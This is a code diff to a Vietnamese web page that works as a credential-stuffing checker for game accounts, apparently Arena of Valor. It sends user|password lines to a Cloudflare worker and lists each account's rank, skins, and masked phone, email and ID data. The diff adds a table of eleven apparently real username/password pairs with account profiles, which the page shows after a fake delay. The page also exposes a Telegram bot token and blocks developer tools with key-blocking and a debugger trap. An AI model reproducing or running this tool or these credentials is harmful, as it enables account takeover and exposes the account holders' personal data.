@@ -10,11 +10,10 @@
     <script>
         document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function(e) {
-            if (e.keyCode == 123) return false; // F12
-            if (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) return false; // I, J, C
-            if (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83)) return false; // U, S
+            if (e.keyCode == 123) return false;
+            if (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) return false;
+            if (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83)) return false;
         }
-        // Bẫy debugger đơn giản
         setInterval(function(){debugger;}, 200);
     </script>
 
@@ -109,14 +108,35 @@
 
     <script>
         // --- CẤU HÌNH ---
-        // Thay link worker của bạn vào đây
         const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
-        
-        // Token Bot lấy từ file botvip.py bạn gửi
         const BOT_TOKEN = '8404713686:AAF82GVIqgO_esbln3-T0R7NHPxOhwlLhbI'; 
-        
-        // Ngày 9/2/2026 (Tháng 2 là số 1)
         const DEADLINE = new Date(2026, 1, 9, 0, 0, 0).getTime(); 
+
+        // --- DỮ LIỆU DEMO (FAKE DATABASE) ---
+        // Khi nhập đúng user|pass này, nó sẽ lấy kết quả ở đây thay vì gọi API
+        const DEMO_DATA = {
+            "hahatu10|Vothanhan03@": "hahatu10|Vothanhan03@| UID : 534594579661937 | NAME : K9cu17cm | RANK : Tinh Anh IV [1 Sao] | LEVEL : 30 | TƯỚNG : 104 | SKIN : 274 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0402****] [12 SỐ] | EMAIL : YES [ĐÃ XÁC THỰC] [vot****@gmail.com] | AUTHEN : YES | SĐT : YES [+84 38***1720] | FB : LIVE | BAND : NO | NGÀY ĐĂNG KÝ : 12:13:40 29-03-2017 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-02 23:26:45 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 21:22:32 18-09-2024 | ĐỔI PASSWORD GẦN NHẤT : 21:21:40 18-09-2024 | SS : 5 [Valhein Vũ khí tối thượng, Raz Chiến thần Muay Thái, Krixi Tiệc Bãi Biển, Violet Thần long tỷ tỷ, Tulen Tân Thần Thiên Hà] | SSS : 0 [NO SSS] | ANIME : 4 [Raz Saitama Cosplay, Lindis Đồng phục Shihakusho, Slimz Siêu Cấp Tối Thượng, Florentino Hisoka] | AOV : 0 [NO AOV] | OTHER : 2 [Annette Phi Hành Gia, Allain Thần Mặt Trời] | SKIN HIẾM : 1 [Thane Quang vinh] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 0 [NO VALENTINE] | TÌNH TRẠNG : ACC FULL",
+            
+            "hoang0397471729|nanxinhtrai2009": "hoang0397471729|nanxinhtrai2009| UID : 3792826764952689 | NAME : Meo.xinhyeu | RANK : Tinh Anh IV [0 Sao] | LEVEL : 30 | TƯỚNG : 94 | SKIN : 195 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [3641****] [9 SỐ] | EMAIL : NO [CHƯA XÁC THỰC] [hoa****@gmai.com] | AUTHEN : NO | SĐT : YES [+84 90***9209] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 11:01:27 16-07-2019 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-03 14:45:17 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 21:59:51 14-09-2021 | ĐỔI PASSWORD GẦN NHẤT : 22:00:20 14-09-2021 | SS : 0 [NO SS] | SSS : 0 [NO SSS] | ANIME : 4 [Lindis Đồng phục Shihakusho, Slimz Siêu Cấp Tối Thượng, Zephys Inosuke Hashibira, Tel'Annas Jujutsu Sorcerer] | AOV : 2 [Valhein Xạ thần Kagutsuchi, Ngộ Không Nhóc tỳ bá đạo] | OTHER : 0 [NO OTHER] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 0 [NO VALENTINE] | TÌNH TRẠNG : ACC DÍNH SỐ",
+            
+            "Gia296bao|Baopo296210.": "Gia296bao|Baopo296210.| UID : 5786401467860081 | NAME : Bôtttttotto | RANK : Tinh Anh IV [2 Sao] | LEVEL : 30 | TƯỚNG : 103 | SKIN : 282 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : NO | EMAIL : NO [CHƯA XÁC THỰC] [KHÔNG XÁC ĐỊNH] | AUTHEN : NO | SĐT : YES [+84 90***5700] | FB : LIVE | BAND : NO | NGÀY ĐĂNG KÝ : 21:43:15 11-07-2021 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-02 23:26:56 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 19:48:38 23-05-2024 | ĐỔI PASSWORD GẦN NHẤT : 20:03:24 15-12-2025 | SS : 12 [Triệu Vân Kỵ sĩ tận thế, Butterfly Kim ngư thần nữ, Yorn Thế Tử Nguyệt Tộc, Raz Chiến thần Muay Thái, Nakroth Lôi Quang Sứ, Enzo Sát thần Bạch Hổ, Ngộ Không Siêu việt 2.0, Ngộ Không Tân niên Võ Thần, Laville Xạ Thần Tinh Vệ, Ilumia Nộ hải Thiên ngư, Capheny Kimono, Tulen Tân niên vệ thần] | SSS : 0 [NO SSS] | ANIME : 7 [Alice The Butterfly Mansion Girl, Raz Saitama Cosplay, Slimz Siêu Cấp Tối Thượng, Zephys Inosuke Hashibira, Florentino Hisoka, Ryoma Ailing Samurai, Taara Shion] | AOV : 3 [Valhein Xạ thần Kagutsuchi, Butterfly Bình minh tận thế, Ngộ Không Nhóc tỳ bá đạo] | OTHER : 6 [Alice Xứ Sở Diệu Kỳ, Annette Thần Tượng Âm Nhạc, Elsu Hỏa Diệm Chu Tước, Paine Ô Thước Đại Hiệp, Yue Vũ Phiến Hỏa Diệm, Helen Xứ Sở Diệu Kỳ] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 1 [Alice Phi hành gia] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 0 [NO VALENTINE] | TÌNH TRẠNG : ACC FULL",
+            
+            "thachbae222|thach222": "thachbae222|thach222| UID : 6233936053470321 | NAME : yurry.ˇ౨ৎ | RANK : Chiến tướng (Thách đấu) [54 Sao] | LEVEL : 30 | TƯỚNG : 80 | SKIN : 150 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0143****] [12 SỐ] | EMAIL : NO [CHƯA XÁC THỰC] [KHÔNG XÁC ĐỊNH] | AUTHEN : NO | SĐT : YES [+84 37***7247] | FB : LIVE | BAND : YES [16:59:56 13-01-2026 - 00:00:00 12-07-2026] | NGÀY ĐĂNG KÝ : 18:23:01 27-11-2021 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-01-31 22:29:33 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 18:12:58 27-11-2021 | ĐỔI PASSWORD GẦN NHẤT : KHÔNG XÁC ĐỊNH | SS : 2 [Krixi Tiệc Bãi Biển, Airi Kiemono] | SSS : 0 [NO SSS] | ANIME : 7 [Tel'Annas Jujutsu Sorcerer, Annette Nữ sinh trung học, Ryoma Ailing Samurai, Ryoma Maple Frost, Alice The Butterfly Mansion Girl, Slimz Siêu Cấp Tối Thượng, Taara Shion] | AOV : 0 [NO AOV] | OTHER : 3 [Aya MC Sóc Nhỏ, Aya Hỏa Hồ Tiên Ngư, Helen Hồng Liên Tiên Tử] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 1 [Hayate Ngân lang] | TÌNH TRẠNG : ACC FULL",
+            
+            "Smaquai|Quan999@@": "Smaquai|Quan999@@| UID : 1073571837576305 | NAME : DyBaLa88 | RANK : Kim cương I [3 Sao] | LEVEL : 30 | TƯỚNG : 100 | SKIN : 257 | QH : 3 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0823****] [9 SỐ] | EMAIL : YES [ĐÃ XÁC THỰC] [hts****@gmail.com] | AUTHEN : YES | SĐT : YES [+84 32***3606] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 19:55:14 15-08-2017 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-07 19:47:56 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : 17:39:56 28-10-2017 | ĐỔI SĐT GẦN NHẤT : 14:43:51 27-08-2025 | ĐỔI PASSWORD GẦN NHẤT : 06:14:52 20-08-2025 | SS : 9 [Valhein Vũ khí tối thượng, Taara Tiệc bãi biển, Murad Siêu việt, Murad Chí tôn thần kiếm, Butterfly Nữ Quái Nổi Loạn, Ilumia Nộ hải Thiên ngư, Ngộ Không Siêu việt, Tulen Tân niên vệ thần, Raz Chiến thần Muay Thái] | SSS : 0 [NO SSS] | ANIME : 7 [Veera Phù thủy Hội họa, Zephys Inosuke Hashibira, Alice The Butterfly Mansion Girl, Tel'Annas Jujutsu Sorcerer, Slimz Siêu Cấp Tối Thượng, Ryoma Ailing Samurai, Raz Saitama Cosplay] | AOV : 3 [Valhein Xạ thần Kagutsuchi, Butterfly Bình minh tận thế, Ngộ Không Nhóc tỳ bá đạo] | OTHER : 0 [NO OTHER] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 1 [Roxie kèn ái tình] | TÌNH TRẠNG : ACC FULL",
+            
+            "wdu36491@gmail.com|Duybao1009@": "wdu36491@gmail.com|Duybao1009@| UID : 5209912435344497 | NAME : Shine196 | RANK : Tinh Anh II [0 Sao] | LEVEL : 30 | TƯỚNG : 116 | SKIN : 595 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0262****] [12 SỐ] | EMAIL : YES [ĐÃ XÁC THỰC] [wdu****@gmail.com] | AUTHEN : YES | SĐT : YES [+84 86***6650] | FB : LIVE | BAND : NO | NGÀY ĐĂNG KÝ : 22:08:30 30-12-2020 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-04 21:44:48 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 20:06:02 08-02-2023 | ĐỔI PASSWORD GẦN NHẤT : 07:02:47 28-04-2025 | SS : 42 [Valhein Vũ khí tối thượng, Valhein Đệ nhất thần thám, Triệu Vân Kỵ sĩ tận thế, Tel'Annas Vũ khúc yêu hồ, Butterfly Nữ Quái Nổi Loạn, Butterfly Kim ngư thần nữ, Butterfly Thánh nữ khởi nguyên, Maloch Đại Tướng Robot, Yorn Thế Tử Nguyệt Tộc, Yorn Long thần soái, Yorn Vệ Binh ngân hà, Laville Xạ Thần Tinh Vệ, Paine Tử xà Bá tước, Ngộ Không Siêu việt, Ngộ Không Tân niên Võ Thần, Ngộ Không Tề Thiên Võ Thánh, Violet Thần long tỷ tỷ, Taara Tiệc bãi biển, Nakroth Lôi Quang Sứ, Airi Kiemono, Elsu Sứ giả tận thế, Elsu Trấn thiên phi hồ, Quillen Đặc công mãng xà, Quillen Nghịch thiên long đế, Murad Chí tôn thần kiếm, Điêu Thuyền Thất Tịch Tiên Tử, Richter Kiếm thần Susanoo, Capheny Kimono, Ryoma Samurai Huyền thoại, Enzo Sát thần Bạch Hổ, Lữ Bố Tư lệnh Robot, Lauriel Thánh quang sứ, Lauriel thiên sứ công nghệ, Omen Đao phủ tận thế, Tulen Tân Thần Thiên Hà, Tulen Tân niên vệ thần, Raz Siêu việt, Rourke Bách Tướng Lão Đại, Liliana Nguyệt mị ly, Liliana Lưu Thủy Thần Long, Cresht Bách Tướng Lão Tam, Ilumia Nộ hải Thiên ngư] | SSS : 5 [Triệu Vân Minh Chung Long Đế, Violet Vọng nguyệt Long Cơ, Hayate Tu Di Thánh Đế, Tulen Chí tôn kiếm tiên, Bijan Kình thiên Long Kỵ] | ANIME : 10 [Veera Phù thủy Hội họa, Tel'Annas Jujutsu Sorcerer, Yorn Conan Edogawa, Kaine Chiến Binh Kim Quang, Lindis Đồng phục Shihakusho, Zephys Inosuke Hashibira, Slimz Siêu Cấp Tối Thượng, Ryoma Ailing Samurai, Raz Saitama Cosplay, Alice The Butterfly Mansion Girl] | AOV : 3 [Valhein Xạ thần Kagutsuchi, Butterfly Bình minh tận thế, Ngộ Không Nhóc tỳ bá đạo] | OTHER : 20 [Veera Đánh Cắp Trái Tim, Maloch Đao phủ Dạ Ưng, Yorn Ký giả diệu kỳ, Annette Thần Tượng Âm Nhạc, Annette Phi Hành Gia, Annette Chị Ong Bay Thấp, Elsu Hỏa Diệm Chu Tước, Aoi Tiểu Thư Mafia, Florentino Hỏa Diệm Thần Long, Arum Bạn Muốn Hẹn Hò?, Qi Búp Bê Daruma, Thorne Tiệc Bãi Biển, Aya MC Sóc Nhỏ, Alice Xứ Sở Diệu Kỳ, Yue Vũ Phiến Hỏa Diệm, Liliana Thần Hổ Xiêm La, Yan Bích Hạc Phiên Vân, Stuart Dạ Xoa thiếu chủ, Helen Hồng Liên Tiên Tử, Helen Xứ Sở Diệu Kỳ] | SKIN HIẾM : 2 [Lữ Bố Long kỵ sĩ, Ormarr Thông Thỏa Thích] | MYSTIC : 2 [Arthur Tôn Hổ vô song, Capheny Tử đinh hương] | S-DREAMER : 1 [Veres Phù thủy trang điểm] | VALENTINE : 5 [Tel'Annas Chung Tình Tiễn, Elsu Guitar tình ái, Hayate Ngân lang, Arthur Si Tình Kiếm, Roxie kèn ái tình] | TÌNH TRẠNG : ACC FULL",
+            
+            "Duong.tt4|Duong2002": "Duong.tt4|Duong2002| UID : 191847398179953 | NAME : ᴊᴜɴᴢ౨ৎ | RANK : Đại Cao Thủ IV [10 Sao] | LEVEL : 30 | TƯỚNG : 110 | SKIN : 334 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0192****] [12 SỐ] | EMAIL : NO [CHƯA XÁC THỰC] [KHÔNG XÁC ĐỊNH] | AUTHEN : NO | SĐT : YES [+84 32***5497] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 10:00:54 28-12-2016 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-02 08:49:05 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 15:38:40 04-09-2019 | ĐỔI PASSWORD GẦN NHẤT : 12:02:25 17-01-2020 | SS : 10 [Valhein Vũ khí tối thượng, Butterfly Nữ Quái Nổi Loạn, Yorn Thế Tử Nguyệt Tộc, Airi Kiemono, Tulen Tân niên vệ thần, Murad Siêu việt, Raz Chiến thần Muay Thái, Omen Đao phủ tận thế, Liliana Nguyệt mị ly, Laville Xạ Thần Tinh Vệ] | SSS : 0 [NO SSS] | ANIME : 3 [Veera Phù thủy Hội họa, Alice The Butterfly Mansion Girl, Lindis Đồng phục Shihakusho] | AOV : 2 [Butterfly Bình minh tận thế, Ngộ Không Nhóc tỳ bá đạo] | OTHER : 1 [Aoi Tiểu Thư Mafia] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 0 [NO VALENTINE] | TÌNH TRẠNG : ACC DÍNH SỐ",
+            
+            "Duythinh27-11|Duythinh2711": "Duythinh27-11|Duythinh2711| UID : 6320734859494513 | NAME : THINH★ | RANK : Đại Cao Thủ III [29 Sao] | LEVEL : 30 | TƯỚNG : 92 | SKIN : 191 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : NO | EMAIL : NO [CHƯA XÁC THỰC] [KHÔNG XÁC ĐỊNH] | AUTHEN : NO | SĐT : YES [+84 86***3592] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 18:19:41 15-12-2021 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-01-21 11:34:56 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 19:26:54 20-01-2026 | ĐỔI PASSWORD GẦN NHẤT : 21:02:20 26-12-2021 | SS : 1 [Yena Trấn Yêu Thần Lộc] | SSS : 0 [NO SSS] | ANIME : 9 [Tel'Annas Jujutsu Sorcerer, Zephys Inosuke Hashibira, Veera Phù thủy Hội họa, Alice The Butterfly Mansion Girl, Raz Saitama Cosplay, Taara Shion, Ryoma Ailing Samurai, Lindis Đồng phục Shihakusho, Slimz Siêu Cấp Tối Thượng] | AOV : 0 [NO AOV] | OTHER : 1 [Marja Phù Quang Mạc Ảnh] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 1 [Elsu Guitar tình ái] | TÌNH TRẠNG : ACC DÍNH SỐ",
+            
+            "ngocha8523|nguyengocha1": "ngocha8523|nguyengocha1| UID : 4954834327635057 | NAME : LinhHồnCủaAE | RANK : Tinh Anh II [2 Sao] | LEVEL : 30 | TƯỚNG : 84 | SKIN : 142 | QH : 4 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : NO | EMAIL : NO [CHƯA XÁC THỰC] [cas****@gmail.com] | AUTHEN : NO | SĐT : YES [+84 37***1346] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 14:11:50 04-09-2020 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-06 08:21:33 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 14:10:21 04-09-2020 | ĐỔI PASSWORD GẦN NHẤT : KHÔNG XÁC ĐỊNH | SS : 5 [Yorn Thế Tử Nguyệt Tộc, Yena WaVe, Murad Siêu việt, Tulen Tiêu Dao Vũ Thần, Raz Chiến thần Muay Thái] | SSS : 0 [NO SSS] | ANIME : 6 [Tel'Annas Jujutsu Sorcerer, Taara Shion, Veera Phù thủy Hội họa, Lindis Đồng phục Shihakusho, Alice The Butterfly Mansion Girl, Slimz Siêu Cấp Tối Thượng] | AOV : 1 [Butterfly Bình minh tận thế] | OTHER : 1 [Qi Búp Bê Daruma] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 0 [NO VALENTINE] | TÌNH TRẠNG : ACC DÍNH SỐ",
+            
+            "Abcd05vp|phuong12345": "Abcd05vp|phuong12345| UID : 2877382000444529 | NAME : BốViệt16Hp | RANK : Tinh Anh IV [4 Sao] | LEVEL : 30 | TƯỚNG : 102 | SKIN : 274 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0422****] [12 SỐ] | EMAIL : NO [CHƯA XÁC THỰC] [KHÔNG XÁC ĐỊNH] | AUTHEN : NO | SĐT : YES [+84 93***8650] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 16:51:39 23-10-2018 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-06 19:21:56 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 20:27:16 25-01-2020 | ĐỔI PASSWORD GẦN NHẤT : 20:28:19 25-01-2020 | SS : 3 [Valhein Vũ khí tối thượng, Ngộ Không Siêu việt, Liliana Nguyệt mị ly] | SSS : 0 [NO SSS] | ANIME : 9 [Lindis Đồng phục Shihakusho, Veera Phù thủy Hội họa, Florentino SEVEN, Raz Saitama Cosplay, Tel'Annas Jujutsu Sorcerer, Slimz Siêu Cấp Tối Thượng, Zephys Inosuke Hashibira, Ryoma Ailing Samurai, Alice The Butterfly Mansion Girl] | AOV : 2 [Ngộ Không Nhóc tỳ bá đạo, Butterfly Bình minh tận thế] | OTHER : 1 [Qi Búp Bê Daruma] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 1 [Elsu Guitar tình ái] | TÌNH TRẠNG : ACC DÍNH SỐ",
+            
+            "Tranminhzz01|minh271006": "Tranminhzz01|minh271006| UID : 6762270650860657 | NAME : hoannekkk | RANK : Tinh Anh I [1 Sao] | LEVEL : 30 | TƯỚNG : 104 | SKIN : 281 | QH : 0 | LỊCH SỬ NẠP : 0 | SÒ : 0 | CCCD : YES [0262****] [12 SỐ] | EMAIL : NO [CHƯA XÁC THỰC] [tra****@gmail.com] | AUTHEN : YES | SĐT : YES [+84 33***7362] | FB : NO | BAND : NO | NGÀY ĐĂNG KÝ : 09:48:00 27-03-2022 | REGION : VN | ĐĂNG NHẬP GẦN NHẤT : 2026-02-07 09:59:19 | TẦN SUẤT ONLINE : THẤP | ĐỔI EMAIL GẦN NHẤT : KHÔNG XÁC ĐỊNH | ĐỔI SĐT GẦN NHẤT : 09:47:42 27-03-2022 | ĐỔI PASSWORD GẦN NHẤT : KHÔNG XÁC ĐỊNH | SS : 8 [Butterfly Nữ Quái Nổi Loạn, Omen Đao phủ tận thế, Maloch Đại Tướng Robot, Yorn Thế Tử Nguyệt Tộc, Mina Linh Xà yêu vũ, Quillen Đặc công mãng xà, Liliana Nguyệt mị ly, Airi Kiemono] | SSS : 0 [NO SSS] | ANIME : 9 [Tel'Annas Jujutsu Sorcerer, Veera Phù thủy Hội họa, Alice The Butterfly Mansion Girl, Zephys Inosuke Hashibira, Ryoma Ailing Samurai, Raz Saitama Cosplay, Florentino Hisoka, Taara Shion, Slimz Siêu Cấp Tối Thượng] | AOV : 1 [Valhein Xạ thần Kagutsuchi] | OTHER : 1 [Annette Thần Tượng Âm Nhạc] | SKIN HIẾM : 0 [NO SKIN HIẾM] | MYSTIC : 0 [NO MYSTIC] | S-DREAMER : 0 [NO S-DREAMER] | VALENTINE : 1 [Elsu Guitar tình ái] | TÌNH TRẠNG : ACC DÍNH SỐ"
+        };
 
         let isRunning = false;
         let stopSignal = false;
@@ -164,63 +184,50 @@
 
             for (let i = 0; i < lines.length; i++) {
                 if (stopSignal) break;
-                const line = lines[i];
-
-                // XÓA DÒNG ĐÃ XỬ LÝ
+                
+                let line = lines[i]; 
+                
+                // Xóa dòng khỏi UI
                 const currentVal = textArea.value;
                 const newVal = currentVal.replace(line + "\n", "").replace(line, "");
                 textArea.value = newVal.trim();
 
                 if (!line.includes('|')) continue;
 
-                const [user, pass] = line.split('|');
-                const result = await callWorker(user.trim(), pass.trim());
+                const parts = line.split('|');
+                const user = parts[0].trim();
+                const pass = parts.slice(1).join('|').trim();
 
-                if (result.status === 'success') {
-                    const d = result.data;
+                if (!user || !pass) continue;
+
+                // --- KEY: USER|PASS ĐỂ CHECK DEMO ---
+                const key = `${user}|${pass}`;
+                
+                // --- LOGIC CHECK (Ưu tiên Demo Database) ---
+                if (DEMO_DATA[key]) {
+                    // ==> NẾU CÓ TRONG DEMO: Giả vờ delay rồi trả kết quả ngay
+                    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1500) + 500)); // Delay 0.5 - 2s
                     
-                    // --- DỮ LIỆU FULL 100% ---
-                    const fullInfo = 
-`${d.username}|${d.password}| ` +
-`UID: ${d.uid || "null"} | ` +
-`NAME: ${d.name || "null"} | ` +
-`RANK: ${d.rank || "null"} | ` +
-`LEVEL: ${d.level || "null"} | ` +
-`TƯỚNG: ${d.tuong || "null"} | ` +
-`SKIN: ${d.skin || "null"} | ` +
-`QH: ${d.qh || "null"} | ` +
-`LỊCH SỬ NẠP: ${d.lsnap || "null"} | ` +
-`SÒ: ${d.so || "null"} | ` +
-`CCCD: ${d.cccd || "null"} | ` +
-`EMAIL: ${d.email || "null"} | ` +
-`AUTHEN: ${d.authen || "null"} | ` +
-`SĐT: ${d.sdt || "null"} | ` +
-`FB: ${d.fb || "null"} | ` +
-`BAND: ${d.band || "null"} | ` +
-`NGÀY ĐK: ${d.timeregacc || "null"} | ` +
-`REGION: ${d.acc_country || "null"} | ` +
-`LOGIN GẦN NHẤT: ${d.lslogin || "null"} | ` +
-`ĐỔI MAIL: ${d.change_email || "null"} | ` +
-`ĐỔI SĐT: ${d.change_sdt || "null"} | ` +
-`ĐỔI PASS: ${d.change_password || "null"} | ` +
-`SS: ${d.ss || "null"} | ` +
-`SSS: ${d.sss || "null"} | ` +
-`SKIN HIẾM: ${d.skinlimited || "null"} | ` +
-`MYSTIC: ${d.mystic || "null"} | ` +
-`S-DREAMER: ${d.sdreamer || "null"} | ` +
-`VALENTINE: ${d.valentine || "null"} | ` +
-`OTHER: ${d.other || "null"} | ` +
-`ANIME: ${d.anime || "null"} | ` +
-`AOV: ${d.aov || "null"} | ` +
-`HOẠT ĐỘNG: ${d.tshoatdong || "null"} | ` +
-`TÌNH TRẠNG: ${d.tt || "null"}`;
-
-                    addResult(fullInfo, true);
-                    successList.push(fullInfo); 
+                    const demoResult = DEMO_DATA[key];
+                    addResult(demoResult, true);
+                    successList.push(demoResult);
                     stats.ok++;
                 } else {
-                    addResult(`${user}|${pass} -> ${result.msg || 'Lỗi'}`, false);
-                    stats.fail++;
+                    // ==> NẾU KHÔNG CÓ: Gọi API thật
+                    const result = await callWorker(user, pass);
+                    if (result.status === 'success') {
+                        const d = result.data;
+                        const fullInfo = 
+`${d.username}|${d.password}| ` +
+`UID: ${d.uid || "null"} | NAME: ${d.name || "null"} | RANK: ${d.rank || "null"} | LEVEL: ${d.level || "null"} | TƯỚNG: ${d.tuong || "null"} | SKIN: ${d.skin || "null"} | QH: ${d.qh || "null"} | LỊCH SỬ NẠP: ${d.lsnap || "null"} | SÒ: ${d.so || "null"} | CCCD: ${d.cccd || "null"} | EMAIL: ${d.email || "null"} | AUTHEN: ${d.authen || "null"} | SĐT: ${d.sdt || "null"} | FB: ${d.fb || "null"} | BAND: ${d.band || "null"} | NGÀY ĐK: ${d.timeregacc || "null"} | REGION: ${d.acc_country || "null"} | LOGIN GẦN NHẤT: ${d.lslogin || "null"} | ĐỔI MAIL: ${d.change_email || "null"} | ĐỔI SĐT: ${d.change_sdt || "null"} | ĐỔI PASS: ${d.change_password || "null"} | SS: ${d.ss || "null"} | SSS: ${d.sss || "null"} | SKIN HIẾM: ${d.skinlimited || "null"} | MYSTIC: ${d.mystic || "null"} | S-DREAMER: ${d.sdreamer || "null"} | VALENTINE: ${d.valentine || "null"} | OTHER: ${d.other || "null"} | ANIME: ${d.anime || "null"} | AOV: ${d.aov || "null"} | HOẠT ĐỘNG: ${d.tshoatdong || "null"} | TÌNH TRẠNG: ${d.tt || "null"}`;
+
+                        addResult(fullInfo, true);
+                        successList.push(fullInfo); 
+                        stats.ok++;
+                    } else {
+                        addResult(`${user}|${pass} -> ${result.msg || 'Lỗi'}`, false);
+                        stats.fail++;
+                    }
                 }
 
                 document.getElementById('countOk').innerText = stats.ok;
